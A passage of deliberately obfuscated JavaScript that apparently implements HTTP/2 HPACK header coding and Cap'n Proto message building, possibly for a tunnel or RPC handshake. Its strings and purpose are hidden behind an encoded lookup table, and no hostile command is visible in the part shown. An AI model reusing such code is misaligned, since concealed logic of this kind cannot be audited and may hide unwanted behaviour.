        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0as() {
    const fG = a0cm, a = {
            'BPYxj': function (c, d) {
                return c < d;
            },
            'MUvOh': function (c, d) {
                return c >= d;
            },
            'UAwKw': function (c, d) {
                return c & d;
            },
            'xRqlp': function (c, d) {
                return c >> d;
            },
            'twVlm': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[fG(0x525)](c, a0aq['length']); c++) {
        const d = a0aq[c], f = a0ar[c];
        let g = b;
        for (let h = f - 0x1; a['MUvOh'](h, 0x0); h--) {
            const i = a[fG(0xbe3)](a[fG(0x876)](d, h), 0x1);
            g[i] === null && (g[i] = [
                null,
                null,
                -0x1,
                a[fG(0x5d1)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0at = a0as();
function a0au(a) {
    const fH = a0cm, b = {
            'BxYGS': function (h, i) {
                return h >= i;
            },
            'ToALs': function (h, i) {
                return h & i;
            },
            'iSZkk': function (h, i) {
                return h >> i;
            },
            'qRAPV': function (h, i) {
                return h | i;
            },
            'RxYVw': function (h, i) {
                return h << i;
            },
            'ZfpKw': function (h, i) {
                return h === i;
            },
            'WiPcL': 'invalid\x20HPACK\x20Huffman\x20string',
            'snrtc': function (h, i) {
                return h >= i;
            },
            'oiYCk': function (h, i) {
                return h === i;
            },
            'UMUJM': function (h, i) {
                return h > i;
            },
            'VNHWv': function (h, i) {
                return h !== i;
            },
            'JGFzM': fH(0x78c)
        }, c = [];
    let d = a0at, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[fH(0x1b0)](i, 0x0); i--) {
            const j = b[fH(0x716)](b[fH(0xca5)](h, i), 0x1);
            f = b[fH(0x76b)](b[fH(0x459)](f, 0x1), j), g += 0x1, d = d[j];
            if (b[fH(0x993)](d, null))
                throw new Error(b['WiPcL']);
            if (b['snrtc'](d[0x2], 0x0)) {
                if (b[fH(0x66a)](d[0x2], 0x100))
                    throw new Error(fH(0x6fc));
                c[fH(0x1d5)](d[0x2]), d = a0at, f = 0x0, g = 0x0;
            }
        }
    }
    if (b[fH(0x10a)](g, 0x7) || b[fH(0x580)](f, b['RxYVw'](0x1, g) - 0x1))
        throw new Error(b[fH(0x52d)]);
    return Buffer[fH(0x1e7)](c);
}
function a0av(a, b, c) {
    const fI = a0cm, d = {
            'Tppuy': function (j, k) {
                return j >= k;
            },
            'FfOHJ': function (j, k) {
                return j - k;
            },
            'ZJxXe': function (j, k) {
                return j << k;
            },
            'gCGEV': function (j, k) {
                return j & k;
            },
            'YSCYL': function (j, k) {
                return j < k;
            },
            'wtkma': fI(0x75b),
            'cPqjK': function (j, k) {
                return j * k;
            },
            'JFtRH': function (j, k) {
                return j & k;
            },
            'YDQQN': function (j, k) {
                return j === k;
            },
            'JSmfs': function (j, k) {
                return j & k;
            },
            'uEcAY': fI(0x4fa)
        };
    if (d['Tppuy'](b, a[fI(0x55c)]))
        throw new Error(fI(0x75b));
    const f = a[b];
    b += 0x1;
    const g = d[fI(0x1f0)](d[fI(0xbd7)](0x1, c), 0x1);
    let h = d[fI(0x278)](f, g);
    if (d['YSCYL'](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a['length'])
            throw new Error(d['wtkma']);
        const j = a[b];
        b += 0x1, h += d[fI(0x467)](d[fI(0x637)](j, 0x7f), Math['pow'](0x2, i));
        if (d['YDQQN'](d[fI(0x59b)](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (i > 0x1c)
            throw new Error(d['uEcAY']);
    }
}
function a0aw(a, b) {
    const fJ = a0cm, c = {
            'tmSsF': function (j, k) {
                return j >= k;
            },
            'TNHIW': fJ(0x50e),
            'MPHTh': function (j, k, l, m) {
                return j(k, l, m);
            },
            'JjbXK': function (j, k) {
                return j > k;
            },
            'rzWfM': fJ(0x6ad),
            'DwWKA': function (j, k) {
                return j(k);
            }
        };
    if (c[fJ(0x9ae)](b, a[fJ(0x55c)]))
        throw new Error(c[fJ(0x903)]);
    const d = Boolean(a[b] & 0x80), [f, g] = c[fJ(0xb9c)](a0av, a, b, 0x7), h = g + f;
    if (c[fJ(0x342)](h, a[fJ(0x55c)]))
        throw new Error(c[fJ(0xa1d)]);
    const i = a[fJ(0x262)](g, h);
    return [
        d ? c[fJ(0xabc)](a0au, i) : i,
        h
    ];
}
class a0ax {
    constructor() {
        const fK = a0cm;
        this[fK(0x62b)] = [], this[fK(0xa44)] = 0x0, this[fK(0x36c)] = 0x1000;
    }
    ['tableEntry'](a) {
        const fL = a0cm, b = {
                'LDJnl': function (d, f) {
                    return d <= f;
                },
                'FfdaZ': fL(0xe8),
                'COfnz': function (d, f) {
                    return d <= f;
                },
                'nbnkk': function (d, f) {
                    return d - f;
                },
                'LTiYi': function (d, f) {
                    return d - f;
                },
                'ncftu': function (d, f) {
                    return d < f;
                }
            };
        if (b[fL(0x594)](a, 0x0))
            throw new Error(b['FfdaZ']);
        if (b['COfnz'](a, a0ap[fL(0x55c)]))
            return a0ap[b[fL(0x8ec)](a, 0x1)];
        const c = b[fL(0xc47)](b[fL(0xc47)](a, a0ap[fL(0x55c)]), 0x1);
        if (b[fL(0xb1a)](c, 0x0) || c >= this[fL(0x62b)][fL(0x55c)])
            throw new Error('HPACK\x20dynamic\x20index\x20out\x20of\x20range');
        return this['dynamic'][c];
    }
    ['add'](a, b) {
        const fM = a0cm, c = {
                'QotJg': function (f, g) {
                    return f + g;
                },
                'DAGbd': fM(0x7d9),
                'XtYlr': function (f, g) {
                    return f > g;
                },
                'fSQoS': function (f, g) {
                    return f > g;
                }
            }, d = c[fM(0xbfe)](0x20, Buffer[fM(0x95e)](a, fM(0x7d9))) + Buffer[fM(0x95e)](b, c[fM(0xd4e)]);
        if (c[fM(0x454)](d, this[fM(0x36c)])) {
            this[fM(0x62b)] = [], this['dynamicSize'] = 0x0;
            return;
        }
        while (c[fM(0x454)](this['dynamic'][fM(0x55c)], 0x0) && c[fM(0x6a0)](c[fM(0xbfe)](this[fM(0xa44)], d), this[fM(0x36c)])) {
            const [f, g] = this[fM(0x62b)][fM(0x3a6)]();
            this['dynamicSize'] -= c[fM(0xbfe)](c[fM(0xbfe)](0x20, Buffer[fM(0x95e)](f, c[fM(0xd4e)])), Buffer['byteLength'](g, c[fM(0xd4e)]));
        }
        this[fM(0x62b)][fM(0x2b8)]([
            a,
            b
        ]), this[fM(0xa44)] += d;
    }
    [a0cm(0x877)](a) {
        const fN = a0cm, b = {
                'sGsMg': function (f, g) {
                    return f < g;
                },
                'kCxZU': function (f, g) {
                    return f & g;
                },
                'hjFbG': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'erIJm': function (f, g, h) {
                    return f(g, h);
                },
                'DeCFC': fN(0x7d9),
                'VvGmu': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'sATZb': function (f, g) {
                    return f > g;
                },
                'fnJzq': fN(0x532),
                'KhhyQ': function (f, g) {
                    return f + g;
                },
                'xygMo': function (f, g) {
                    return f + g;
                }
            }, c = [];
        let d = 0x0;
        while (b[fN(0x50d)](d, a[fN(0x55c)])) {
            const f = a[d];
            if (b[fN(0xb0d)](f, 0x80)) {
                let j;
                [j, d] = b[fN(0xa8e)](a0av, a, d, 0x7), c['push'](this[fN(0x457)](j));
                continue;
            }
            if (b['kCxZU'](f, 0x40)) {
                let k, l;
                [k, d] = b[fN(0xa8e)](a0av, a, d, 0x6);
                if (k)
                    l = this[fN(0x457)](k)[0x0];
                else {
                    let o;
                    [o, d] = b['erIJm'](a0aw, a, d), l = o['toString'](fN(0x7d9))[fN(0x426)]();
                }
                let m;
                [m, d] = a0aw(a, d);
                const n = m[fN(0x7a0)](b['DeCFC']);
                this[fN(0x1d9)](l, n), c[fN(0x1d5)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b[fN(0xb0d)](f, 0x20)) {
                let p;
                [p, d] = b[fN(0xa42)](a0av, a, d, 0x5);
                if (b[fN(0x2de)](p, 0x1000))
                    throw new Error(b[fN(0x957)]);
                this['maxSize'] = p;
                while (b[fN(0x2de)](this[fN(0x62b)][fN(0x55c)], 0x0) && b[fN(0x2de)](this[fN(0xa44)], p)) {
                    const [q, r] = this[fN(0x62b)][fN(0x3a6)]();
                    this['dynamicSize'] -= b[fN(0x8bb)](b[fN(0xd57)](0x20, Buffer['byteLength'](q, b['DeCFC'])), Buffer[fN(0x95e)](r, b['DeCFC']));
                }
                continue;
            }
            let g, h;
            [g, d] = a0av(a, d, 0x4);
            if (g)
                h = this[fN(0x457)](g)[0x0];
            else {
                let s;
                [s, d] = a0aw(a, d), h = s[fN(0x7a0)](b[fN(0xca8)])[fN(0x426)]();
            }
            let i;
            [i, d] = a0aw(a, d), c[fN(0x1d5)]([
                h,
                i[fN(0x7a0)](b[fN(0xca8)])
            ]);
        }
        return c;
    }
}
function a0ay(a, b, c) {
    const fO = a0cm, d = {
            'wykEh': function (h, i) {
                return h - i;
            },
            'LMiOC': function (h, i) {
                return h << i;
            },
            'uVARi': function (h, i) {
                return h | i;
            },
            'jBoWt': function (h, i) {
                return h | i;
            },
            'RDjCo': function (h, i) {
                return h >= i;
            },
            'tqDYh': function (h, i) {
                return h / i;
            }
        }, f = d['wykEh'](d['LMiOC'](0x1, b), 0x1);
    if (a < f)
        return Buffer[fO(0x1e7)]([d[fO(0xc67)](c, a)]);
    const g = [d[fO(0x2a7)](c, f)];
    a -= f;
    while (d[fO(0x9f4)](a, 0x80)) {
        g[fO(0x1d5)](d[fO(0xc67)](a & 0x7f, 0x80)), a = Math[fO(0x19a)](d[fO(0xda1)](a, 0x80));
    }
    return g[fO(0x1d5)](a), Buffer[fO(0x1e7)](g);
}
function a0az(a) {
    const fP = a0cm, b = {
            'KkeRf': fP(0x7d9),
            'SrqMf': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[fP(0x1e7)](a, b[fP(0x1ec)]);
    return Buffer[fP(0x5f9)]([
        b['SrqMf'](a0ay, c[fP(0x55c)], 0x7, 0x0),
        c
    ]);
}
function a0aA(a) {
    const fQ = a0cm, b = {
            'FIwvG': function (d, f) {
                return d === f;
            },
            'bBwjl': fQ(0x7a3),
            'mpwfW': function (d, f) {
                return d === f;
            },
            'WcBHI': fQ(0x8ac),
            'XXIRP': function (d, f) {
                return d === f;
            },
            'dYoDZ': function (d, f) {
                return d === f;
            },
            'mcWvu': fQ(0xade),
            'beRtp': function (d, f) {
                return d === f;
            },
            'rZUrH': '206',
            'hOFvc': fQ(0x86b),
            'GLYpa': function (d, f) {
                return d === f;
            },
            'sinAv': fQ(0xda0),
            'grhQO': function (d, f) {
                return d === f;
            },
            'GZvpI': function (d, f) {
                return d === f;
            },
            'libaH': fQ(0x8f4),
            'SLfeH': function (d, f) {
                return d === f;
            },
            'mwYxj': fQ(0xd75),
            'UCvrM': function (d, f, g, h) {
                return d(f, g, h);
            },
            'fhyQC': function (d, f) {
                return d(f);
            },
            'TzZxX': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b['FIwvG'](d, b[fQ(0x45f)]) && b[fQ(0x7df)](f, b['WcBHI']))
            c[fQ(0x1d5)](0x88);
        else {
            if (b[fQ(0x65c)](d, b[fQ(0x45f)]) && b['dYoDZ'](f, b[fQ(0x54a)]))
                c[fQ(0x1d5)](0x89);
            else {
                if (b[fQ(0x7df)](d, b[fQ(0x45f)]) && b[fQ(0x552)](f, b[fQ(0x61e)]))
                    c[fQ(0x1d5)](0x8a);
                else {
                    if (d === fQ(0x7a3) && f === b[fQ(0xac2)])
                        c[fQ(0x1d5)](0x8b);
                    else {
                        if (b[fQ(0x65c)](d, b[fQ(0x45f)]) && b[fQ(0x2bc)](f, b['sinAv']))
                            c[fQ(0x1d5)](0x8c);
                        else {
                            if (b[fQ(0xce0)](d, b[fQ(0x45f)]) && b[fQ(0x3ff)](f, b[fQ(0xd3e)]))
                                c[fQ(0x1d5)](0x8d);
                            else
                                b[fQ(0x23b)](d, b[fQ(0x45f)]) && b[fQ(0x2bc)](f, b[fQ(0xec)]) ? c[fQ(0x1d5)](0x8e) : (c['push'](...b['UCvrM'](a0ay, 0x0, 0x4, 0x0)), c[fQ(0x1d5)](...b['fhyQC'](a0az, d)), c[fQ(0x1d5)](...b[fQ(0x7bb)](a0az, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[fQ(0x1e7)](c);
}
class a0aB {
    constructor() {
        const fR = a0cm;
        this[fR(0x8db)] = [];
    }
    [a0cm(0x2d9)](a) {
        const fS = a0cm, b = {
                'wvDxM': function (d, f) {
                    return d < f;
                }
            }, c = this[fS(0x8db)][fS(0x55c)];
        for (let d = 0x0; b[fS(0x37d)](d, a); d++) {
            this[fS(0x8db)][fS(0x1d5)](0x0n);
        }
        return c;
    }
    [a0cm(0x50f)](a, b, c, d) {
        const fT = a0cm, f = {
                'aKAgD': function (j, k) {
                    return j - k;
                },
                'dSLsI': function (j, k) {
                    return j(k);
                },
                'mwnVq': function (j, k) {
                    return j | k;
                },
                'SyLyA': function (j, k) {
                    return j & k;
                },
                'mbfPD': function (j, k) {
                    return j(k);
                },
                'JJaHe': function (j, k) {
                    return j | k;
                },
                'TFypJ': function (j, k) {
                    return j << k;
                }
            }, g = f[fT(0xc98)](f['aKAgD'](b, a), 0x1), h = f[fT(0x1e1)](BigInt, g) << 0x2n & 0xfffffffcn, i = f['mwnVq'](BigInt(f['SyLyA'](c, 0xffff)), f[fT(0x8b2)](BigInt, d & 0xffff) << 0x10n);
        this['words'][a] = f[fT(0xa0a)](h, f[fT(0x621)](i, 0x20n));
    }
    [a0cm(0x74f)](a, b, c) {
        const fU = a0cm, d = {
                'eAUAn': function (g, h) {
                    return g << h;
                },
                'UQzbi': function (g, h) {
                    return g(h);
                },
                'IFtSl': function (g, h) {
                    return g | h;
                },
                'FVJBR': function (g, h) {
                    return g << h;
                },
                'mvabX': function (g, h) {
                    return g & h;
                },
                'KLZjA': function (g, h) {
                    return g * h;
                }
            }, f = d[fU(0xc93)](0xffn, d['UQzbi'](BigInt, b * 0x8));
        this['words'][a] = d['IFtSl'](this[fU(0x8db)][a] & ~f, d[fU(0xd1e)](d[fU(0x909)](BigInt, d[fU(0xb26)](c, 0xff)), d['UQzbi'](BigInt, d[fU(0xa90)](b, 0x8))));
    }
    [a0cm(0xb41)](a, b, c) {
        const fV = a0cm, d = {
                'nDzUb': function (g, h) {
                    return g * h;
                },
                'yPOah': function (g, h) {
                    return g | h;
                },
                'JcprT': function (g, h) {
                    return g << h;
                },
                'NPPbO': function (g, h) {
                    return g(h);
                },
                'QFVVu': function (g, h) {
                    return g * h;
                }
            }, f = 0xffffn << BigInt(d[fV(0x4b1)](b, 0x8));
        this['words'][a] = d[fV(0xb4a)](this[fV(0x8db)][a] & ~f, d[fV(0x73d)](BigInt(c & 0xffff), d['NPPbO'](BigInt, d[fV(0x678)](b, 0x8))));
    }
    ['setU32'](a, b, c) {
        const fW = a0cm, d = {
                'egoIb': function (g, h) {
                    return g << h;
                },
                'KBeDr': function (g, h) {
                    return g(h);
                },
                'ntyBL': function (g, h) {
                    return g * h;
                },
                'zJZdS': function (g, h) {
                    return g | h;
                },
                'VObSz': function (g, h) {
                    return g << h;
                },
                'JDxdk': function (g, h) {
                    return g * h;
                }
            }, f = d[fW(0x631)](0xffffffffn, d[fW(0x9c4)](BigInt, d[fW(0x9bc)](b, 0x8)));
        this['words'][a] = d[fW(0x531)](this[fW(0x8db)][a] & ~f, d[fW(0xbd5)](d[fW(0x9c4)](BigInt, c & 0xffffffff), d[fW(0x9c4)](BigInt, d[fW(0x6e3)](b, 0x8))));
    }
    ['setU64'](a, b) {
        const fX = a0cm, c = {
                'aMwUP': function (d, f) {
                    return d & f;
                },
                'Suyub': function (d, f) {
                    return d(f);
                }
            };
        this[fX(0x8db)][a] = c['aMwUP'](c[fX(0xa6a)](BigInt, b), 0xffffffffffffffffn);
    }
    [a0cm(0xda5)](a, b, c = ![]) {
        const fY = a0cm, d = {
                'FMpGb': function (m, n) {
                    return m === n;
                },
                'ibSOU': 'string',
                'jGMMR': function (m, n) {
                    return m + n;
                },
                'UvPnd': function (m, n) {
                    return m / n;
                },
                'nxCKt': function (m, n) {
                    return m < n;
                },
                'tzWdP': function (m, n) {
                    return m + n;
                },
                'rkvVm': function (m, n) {
                    return m / n;
                },
                'CNjZO': function (m, n) {
                    return m - n;
                },
                'Nabwt': function (m, n) {
                    return m & n;
                },
                'cxSzX': function (m, n) {
                    return m | n;
                },
                'WMREE': function (m, n) {
                    return m << n;
                },
                'Rmoxz': function (m, n) {
                    return m(n);
                },
                'rzUbw': function (m, n) {
                    return m | n;
                },
                'FfMAl': function (m, n) {
                    return m << n;
                },
                'JGmOe': function (m, n) {
                    return m << n;
                }
            }, f = d['FMpGb'](typeof b, d[fY(0x456)]) ? Buffer['from'](b, fY(0x7d9)) : b, g = d[fY(0x9db)](f[fY(0x55c)], c ? 0x1 : 0x0), h = this[fY(0x2d9)](Math[fY(0x6f3)](d[fY(0xb37)](g, 0x8)));
        for (let m = 0x0; d[fY(0xa07)](m, f[fY(0x55c)]); m++) {
            this['setU8'](d['tzWdP'](h, Math[fY(0x19a)](d[fY(0xdb2)](m, 0x8))), m % 0x8, f[m]);
        }
        const j = d[fY(0x84c)](h - a, 0x1), k = d[fY(0x69a)](d[fY(0x235)](d['WMREE'](d[fY(0x26b)](BigInt, j), 0x2n), 0x1n), 0xffffffffn), l = d[fY(0xd7e)](0x2n, d[fY(0x4c8)](d['Rmoxz'](BigInt, d[fY(0x69a)](g, 0x1fffffff)), 0x3n));
        this[fY(0x8db)][a] = d[fY(0xd7e)](k, d[fY(0x9c7)](l, 0x20n));
    }
    [a0cm(0x99d)](a, b) {
        const fZ = a0cm, c = {
                'birsC': function (g, h) {
                    return g - h;
                },
                'UwfcY': function (g, h) {
                    return g & h;
                },
                'LtrZo': function (g, h) {
                    return g | h;
                },
                'OBtoU': function (g, h) {
                    return g << h;
                },
                'yMlVd': function (g, h) {
                    return g(h);
                },
                'zKBJc': function (g, h) {
                    return g | h;
                },
                'QJxtx': function (g, h) {
                    return g(h);
                }
            };
        if (!b[fZ(0x55c)]) {
            this[fZ(0x8db)][a] = 0x0n;
            return;
        }
        const d = this[fZ(0x2d9)](b['length']), f = c[fZ(0x312)](c[fZ(0x312)](d, a), 0x1);
        this[fZ(0x8db)][a] = c['UwfcY'](c[fZ(0x404)](c[fZ(0xda3)](c[fZ(0x5ee)](BigInt, f), 0x2n), 0x1n), 0xffffffffn) | c[fZ(0x688)](0x6n, c[fZ(0xda3)](c[fZ(0xd4a)](BigInt, b[fZ(0x55c)]), 0x3n)) << 0x20n;
        for (let g = 0x0; g < b[fZ(0x55c)]; g++) {
            this[fZ(0xda5)](d + g, b[g], !![]);
        }
    }
    [a0cm(0x818)](a, b, c, d, f) {
        const g0 = a0cm, g = {
                'MFmQh': function (m, n) {
                    return m | n;
                },
                'EsgoS': function (m, n) {
                    return m & n;
                },
                'CpsLf': function (m, n) {
                    return m << n;
                },
                'wNEOU': function (m, n) {
                    return m(n);
                },
                'shlFo': function (m, n) {
                    return m | n;
                },
                'fFnQy': function (m, n) {
                    return m << n;
                },
                'FBiyP': function (m, n) {
                    return m * n;
                },
                'BGdKl': function (m, n) {
                    return m(n);
                },
                'qsYtx': function (m, n) {
                    return m | n;
                },
                'ArrgI': function (m, n) {
                    return m | n;
                },
                'UPYra': function (m, n) {
                    return m << n;
                },
                'COfXy': function (m, n) {
                    return m(n);
                },
                'dLdjP': function (m, n) {
                    return m << n;
                },
                'wOjpO': function (m, n) {
                    return m < n;
                },
                'LuYPd': function (m, n, o) {
                    return m(n, o);
                },
                'zccVk': function (m, n) {
                    return m + n;
                }
            }, h = this['alloc'](0x1), j = c + d, k = this[g0(0x2d9)](b * j), l = h - a - 0x1;
        this[g0(0x8db)][a] = g[g0(0x56d)](g['EsgoS'](g[g0(0x56d)](g[g0(0x608)](g[g0(0xb92)](BigInt, l), 0x2n), 0x1n), 0xffffffffn), g[g0(0x4c5)](g['fFnQy'](g['FBiyP'](BigInt(b), g[g0(0x7a5)](BigInt, j)), 0x3n), 0x7n) << 0x20n), this[g0(0x8db)][h] = g[g0(0xa0d)](g[g0(0x33e)](g[g0(0x55d)](g[g0(0xc1e)](BigInt, b), 0x2n), g['dLdjP'](g[g0(0x7a5)](BigInt, c), 0x20n)), BigInt(d) << 0x30n);
        for (let m = 0x0; g[g0(0x400)](m, b); m++) {
            g[g0(0xce3)](f, m, g[g0(0x5b6)](k, g[g0(0x18f)](m, j)));
        }
    }
    [a0cm(0x6eb)]() {
        const g1 = a0cm, a = {
                'GwqZV': function (d, f) {
                    return d * f;
                },
                'STobH': function (d, f) {
                    return d < f;
                },
                'seQvR': function (d, f) {
                    return d * f;
                }
            }, b = Buffer[g1(0x2d9)](0x8);
        b[g1(0x775)](0x0, 0x0), b[g1(0x775)](this[g1(0x8db)][g1(0x55c)], 0x4);
        const c = Buffer[g1(0x2d9)](a[g1(0x590)](this[g1(0x8db)][g1(0x55c)], 0x8));
        for (let d = 0x0; a[g1(0x6c7)](d, this['words'][g1(0x55c)]); d++) {
            c[g1(0x1ee)](this[g1(0x8db)][d] & 0xffffffffffffffffn, a[g1(0xb5b)](d, 0x8));
        }
        return Buffer[g1(0x5f9)]([
            b,
            c
        ]);
    }
}
function a0b(a, b) {
    a = a - 0xe5;
    const c = a0a();
    let d = c[a];
    if (a0b['INJqVB'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['StYuku'] = e, a0b['odLeCR'] = {}, a0b['INJqVB'] = !![];
    }
    const f = c[0x0];
    a0b['lbwQlr'] !== f && (a0b['odLeCR'] = {}, a0b['lbwQlr'] = f);
    const g = a0b['odLeCR'][a];
    return g === undefined ? (d = a0b['StYuku'](d), a0b['odLeCR'][a] = d) : d = g, d;
}
function a0aC(a) {
    const g2 = a0cm, b = new a0aB(), c = b[g2(0x2d9)](0x1), d = b[g2(0x2d9)](0x1), f = b['alloc'](0x1);
    b['structPtr'](c, d, 0x1, 0x1), b[g2(0xb41)](d, 0x0, 0x8);
    const g = b[g2(0x2d9)](0x1);
    return b[g2(0x2d9)](0x1), b[g2(0x50f)](f, g, 0x1, 0x1), b[g2(0xc06)](g, 0x0, a), b['finish']();
}
function a0aD(a, b, c, d, f, g) {
    const g3 = a0cm, h = {
            'OTOpf': function (H, I) {
                return H & I;
            },
            'cKvRb': function (H, I) {
                return H | I;
            },
            'BCmgW': function (H, I) {
                return H & I;
            },
            'HxYWc': g3(0x214),
            'sMiaz': g3(0x421),
            'wSmtL': g3(0xc3d)
        }, i = new a0aB(), j = i[g3(0x2d9)](0x1), k = i[g3(0x2d9)](0x1), l = i[g3(0x2d9)](0x1);
    i[g3(0x50f)](j, k, 0x1, 0x1), i['setU16'](k, 0x0, 0x2);
    const m = i[g3(0x2d9)](0x1), n = i[g3(0x2d9)](0x1);
    i[g3(0x2d9)](0x1);
    const o = i[g3(0x2d9)](0x1), p = i[g3(0x2d9)](0x1);
    i[g3(0x2d9)](0x1), i[g3(0x50f)](l, m, 0x3, 0x3), i['setU32'](m, 0x0, a), i[g3(0xac9)](n, 0xf71695ec7fe85497n);
    const q = i[g3(0x2d9)](0x1), r = i[g3(0x2d9)](0x1);
    i[g3(0x50f)](o, q, 0x1, 0x1), i[g3(0xb41)](q, 0x4, 0x1);
    const s = i[g3(0x2d9)](0x1);
    i[g3(0x2d9)](0x1), i[g3(0x50f)](r, s, 0x1, 0x1), i[g3(0xc06)](s, 0x0, b);
    const t = i['alloc'](0x1);
    i[g3(0x2d9)](0x1), i[g3(0x50f)](p, t, 0x0, 0x2);
    const u = i[g3(0x2d9)](0x1), v = i[g3(0x2d9)](0x1), w = i['alloc'](0x1), x = i['alloc'](0x1);
    i[g3(0x50f)](t, u, 0x1, 0x3), i[g3(0x74f)](u, 0x0, g);
    const y = i[g3(0x2d9)](0x1), z = i[g3(0x2d9)](0x1);
    i[g3(0x50f)](v, y, 0x0, 0x2), i[g3(0xda5)](y, c, !![]), i[g3(0xda5)](z, d), i['writeBytes'](w, f);
    const A = i['alloc'](0x1), B = i[g3(0x2d9)](0x1);
    i[g3(0x2d9)](0x1), i[g3(0x50f)](x, A, 0x1, 0x2);
    const C = i[g3(0x2d9)](0x1), D = i[g3(0x2d9)](0x1), E = i[g3(0x2d9)](0x1), F = i[g3(0x2d9)](0x1);
    i['structPtr'](B, C, 0x0, 0x4);
    const G = a0k[g3(0x395)](0x10);
    return G[0x6] = h[g3(0xa33)](G[0x6], 0xf) | 0x40, G[0x8] = h[g3(0xd63)](h[g3(0x659)](G[0x8], 0x3f), 0x80), i[g3(0xda5)](C, G), i[g3(0x99d)](D, [
        h[g3(0xb4f)],
        h['sMiaz']
    ]), i[g3(0xda5)](E, g3(0x2ed), !![]), i[g3(0xda5)](F, h[g3(0x52a)], !![]), i[g3(0x6eb)]();
}
function a0aE(a) {
    const g4 = a0cm, b = {
            'XjYmw': function (f, g) {
                return f >= g;
            },
            'VAFeT': function (f, g) {
                return f - g;
            },
            'aHLbu': function (f, g) {
                return f + g;
            },
            'RmECj': function (f, g) {
                return f % g;
            },
            'fftgu': function (f, g) {
                return f < g;
            },
            'wAFHE': function (f, g) {
                return f + g;
            },
            'pnHBE': function (f, g) {
                return f * g;
            },
            'mYLsF': function (f, g) {
                return f + g;
            },
            'lJAHW': g4(0xad7),
            'CTUYU': function (f, g) {
                return f + g;
            },
            'byVdf': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b[g4(0xcbb)](b[g4(0xcdf)](a['length'], d), 0x8)) {
        const f = a['readUInt32LE'](d), g = a['readUInt32LE'](b[g4(0xb1d)](d, 0x4)), h = b[g4(0xb1d)](f, 0x1);
        let j = b[g4(0xb1d)](h, 0x1), k = j * 0x4;
        b[g4(0xa99)](k, 0x8) && (k += 0x4);
        if (b[g4(0x768)](b[g4(0xcdf)](a[g4(0x55c)], d), k))
            break;
        const l = [g];
        for (let n = 0x1; b['fftgu'](n, h); n++) {
            l[g4(0x1d5)](a[g4(0x862)](b[g4(0x303)](b[g4(0xb1d)](d, 0x4), b[g4(0x401)](n, 0x4))));
        }
        const m = b['mYLsF'](k, b[g4(0x401)](l[g4(0x2ec)]((o, p) => o + p, 0x0), 0x8));
        if (b[g4(0x768)](a['length'] - d, m))
            break;
        if (h !== 0x1)
            throw new Error(b[g4(0xd43)]);
        c[g4(0x1d5)](a[g4(0x262)](b[g4(0xdaa)](d, k), b[g4(0xa03)](d, m))), d += m;
    }
    return [
        c,
        a[g4(0x262)](d)
    ];
}
function a0aF(a, b) {
    const g5 = a0cm, c = {
            'aYXYd': function (j, k) {
                return j >= k;
            },
            'VYKge': g5(0x304),
            'mUago': function (j, k) {
                return j !== k;
            },
            'OTrUA': function (j, k) {
                return j & k;
            },
            'OrnoC': 'expected\x20Cap\x27n\x20Proto\x20struct\x20pointer',
            'reMcP': function (j, k) {
                return j & k;
            },
            'sDtxT': function (j, k) {
                return j(k);
            },
            'YFCIF': function (j, k) {
                return j(k);
            },
            'GRuso': function (j, k) {
                return j & k;
            },
            'IuvLy': function (j, k) {
                return j >> k;
            },
            'qNctb': function (j, k) {
                return j < k;
            },
            'rvLCg': function (j, k) {
                return j + k;
            },
            'GqUTa': function (j, k) {
                return j + k;
            }
        };
    if (c[g5(0x6ac)](b, a[g5(0x55c)]))
